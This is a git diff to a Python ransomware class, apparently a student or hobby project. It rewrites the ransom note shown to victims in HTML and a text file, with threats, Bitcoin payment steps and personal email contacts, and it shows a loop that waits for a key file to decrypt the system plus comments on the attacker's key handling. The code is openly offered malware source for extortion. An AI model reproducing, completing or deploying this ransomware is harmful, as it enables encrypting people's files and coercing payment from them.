@@ -130,30 +130,56 @@ class RansomWare:
         # Define the file name
         filename = 'ransom.html'
 
-        # Define some sample headings and contents
-        headings = ['Ransomware Execution']
-        contents = ['Your system is hacked! and the only way to unfreeze it is to pay ransom of $1000 USD to the '
-                    'following emails<br>'
-                    '<br>a00257491@mycambrian.ca'
-                    '<br>a00281563@mycambrian.ca'
-                    '<br>a00268573@mycambrian.ca']
+        # URL of the image you want to display
+        image_url = r"C:\Users\Maaz\Documents\Python-Ransomware\bot.jpg"
 
-        image_path = r"C:\Users\Maaz\Documents\Python-Ransomware\bot.jpg"
+        # Define specific width and height for the image
+        image_width = "400"  # Width in pixels
+        image_height = "300"  # Height in pixels
+
+        # Ransom note content
+        ransom_note = """
+        <div class="ransom-note">
+            <h2>Your system has been encrypted with a Military-grade encryption algorithm.</h2>
+            <h2>There is no way to restore your data without a special key.</h2>
+
+            <p>Only we can decrypt your files!</p>
+
+            <p>To purchase your key and restore your data, please follow these three easy steps:</p>
+
+            <ol>
+                <li>Email the file called EMAIL_ME.txt at C:\\Users\\Maaz\\Desktop\\EMAIL_ME.txt to maazsabahuddin@gmail.com</li>
+                <li>You will receive your personal BTC address for payment. Once payment has been completed, send another email to altamashkarlekar@gmail.com stating "PAID". We will check to see if payment has been paid.</li>
+                <li>You will receive a text file with your KEY that will unlock all your files. IMPORTANT: To decrypt your files, place the text file on the desktop and wait. Shortly after it will begin to decrypt all files.</li>
+            </ol>
+
+            <p>WARNING:</p>
+            <ul>
+                <li>Do NOT attempt to decrypt your files with any software because that will not work, and may cost you more to unlock your files.</li>
+                <li>Do NOT change file names, mess with the files, or run decryption software as it will cost you more to unlock your files and there is a high chance you will lose your files forever.</li>
+                <li>Do NOT send "PAID" button without paying, the price WILL go up for disobedience.</li>
+                <li>Do NOT think that we won't delete your files altogether and throw away the key if you refuse to pay.</li>
+            </ul>
+        </div>
+        """
 
         # Create and write to the HTML file
         with open(filename, 'w') as file:
-            file.write('<html>\n<head>\n<title>Random Content</title>\n')
-            # Add CSS to center content
-            file.write('<style>body { text-align: center; }</style>\n')
+            file.write('<html>\n<head>\n<title>Ransom Note</title>\n')
+            # Add CSS
+            file.write('<style>')
+            file.write('body { text-align: center; }')  # Center the content
+            file.write(
+                '.ransom-note { text-align: left; text-justify: inter-word; max-width: 800px; margin: auto; }'
+            )
+            file.write('</style>\n')
             file.write('</head>\n<body>\n')
 
-            # Add image
-            file.write(f'<img src="{image_path}" alt="Ransomware" width="400" height="300">\n')
+            # Add image with specific width and height
+            file.write(f'<img src="{image_url}" alt="Sample Image" width="{image_width}" height="{image_height}">\n')
 
-            # Add random headings and contents
-            for heading, content in zip(headings, contents):
-                file.write(f'<h1>{heading}</h1>\n')
-                file.write(f'<p>{content}</p>\n')
+            # Add ransom note content
+            file.write(ransom_note)
 
             file.write('</body>\n</html>')
 
@@ -162,12 +188,6 @@ class RansomWare:
 
         # Open in the default web browser
         webbrowser.open(f'file://{abs_path}')
-
-    # @staticmethod
-    # def what_is_bitcoin():
-    #     url = 'https://bitcoin.org'
-    #     # Open browser to the https://bitcoin.org so they know what bitcoin is
-    #     webbrowser.open(url)
 
     def change_desktop_background(self):
         imageUrl = 'https://images.idgesg.net/images/article/2018/02/ransomware_hacking_thinkstock_903183876' \
@@ -183,16 +203,19 @@ class RansomWare:
         date = datetime.date.today().strftime('%d-%B-Y')
         with open('RANSOM_NOTE.txt', 'w') as f:
             f.write(f'''
-The harddisks of your computer have been encrypted with an Military grade encryption algorithm.
-There is no way to restore your data without a special key.
+            
+** Your system have been encrypted with a Military grade encryption algorithm. **
+
+** There is no way to restore your data without a special key. **
+
 Only we can decrypt your files!
 
 To purchase your key and restore your data, please follow these three easy steps:
 
-1. Email the file called EMAIL_ME.txt at {self.sysRoot}\Desktop\EMAIL_ME.txt to maazsabahuddin@gmail.com
+1. Email the file called EMAIL_ME.txt at C:\\Users\Maaz\Desktop\EMAIL_ME.txt to maazsabahuddin@gmail.com
 
-2. You will recieve your personal BTC address for payment.
-   Once payment has been completed, send another email to GetYourFilesBack@protonmail.com stating "PAID".
+2. You will receive your personal BTC address for payment.
+   Once payment has been completed, send another email to altamashkarlekar@gmail.com stating "PAID".
    We will check to see if payment has been paid.
 
 3. You will receive a text file with your KEY that will unlock all your files. 
@@ -200,13 +223,17 @@ To purchase your key and restore your data, please follow these three easy steps
    all files.
 
 WARNING:
-Do NOT attempt to decrypt your files with any software as it is obselete and will not work, and may cost you more to 
-unlcok your files.
-Do NOT change file names, mess with the files, or run deccryption software as it will cost you more to unlock 
-your files-
--and there is a high chance you will lose your files forever.
+
+- Do NOT attempt to decrypt your files with any software because that will not work, and may cost you more to
+unlock your files.
+
+- Do NOT change file names, mess with the files, or run decryption software as it will cost you more to unlock
+your files and there is a high chance you will lose your files forever.
+
 Do NOT send "PAID" button without paying, price WILL go up for disobedience.
-Do NOT think that we wont delete your files altogether and throw away the key if you refuse to pay. WE WILL.
+
+Do NOT think that we won't delete your files altogether and throw away the key if you refuse to pay.
+
 ''')
 
     def show_ransom_note(self):
@@ -234,7 +261,7 @@ Do NOT think that we wont delete your files altogether and throw away the key if
             if count == 5:
                 break
     
-    # Decrypts system when text file with un-encrypted key in it is placed on dekstop of target machine
+    # Decrypts system when text file with un-encrypted key in it is placed on desktop of target machine
     def put_me_on_desktop(self):
         # Loop to check file and if file it will read key and then self.key + self.cryptor will be valid for decrypting-
         # -the files
@@ -243,25 +270,20 @@ Do NOT think that we wont delete your files altogether and throw away the key if
             try:
                 print('trying')  # Debugging/Testing
                 # The ATTACKER decrypts the fernet symmetric key on their machine and then puts the un-encrypted fernet-
-                # -key in this file and sends it in a email to victim. They then put this on the desktop and it will be-
-                # -used to un-encrypt the system. AT NO POINT DO WE GIVE THEM THE PRIVATE ASSYEMTRIC KEY etc.
+                # -key in this file and sends it in an email to victim. They then put this on the desktop, and it will
+                # be used to un-encrypt the system. AT NO POINT DO WE GIVE THEM THE PRIVATE ASYMMETRIC KEY etc.
                 with open(f'{self.sysRoot}\Desktop\PUT_ME_ON_DESKTOP.txt', 'r') as f:
                     self.key = f.read()
                     self.crypter = Fernet(self.key)
-                    # Decrpyt system once have file is found and we have cryptor with the correct key
+                    # Decrypt system once have filed is found, and we have cryptor with the correct key
                     self.crypt_system(encrypted=True)
                     print('decrypted')  # Debugging/Testing
                     break
             except Exception as e:
                 print(e)  # Debugging/Testing
                 pass
-            time.sleep(10)  # Debugging/Testing check for file on desktop ever 10 seconds
+            time.sleep(10)  # Debugging/Testing check for file on desktop every 10 seconds
             print('Checking for PUT_ME_ON_DESKTOP.txt')  # Debugging/Testing
-            # Would use below code in real life etc... above 10secs is just to "show" concept
-            # Sleep ~ 3 mins
-            # secs = 60
-            # mins = 3
-            # time.sleep((mins*secs))
 
 
 def main():
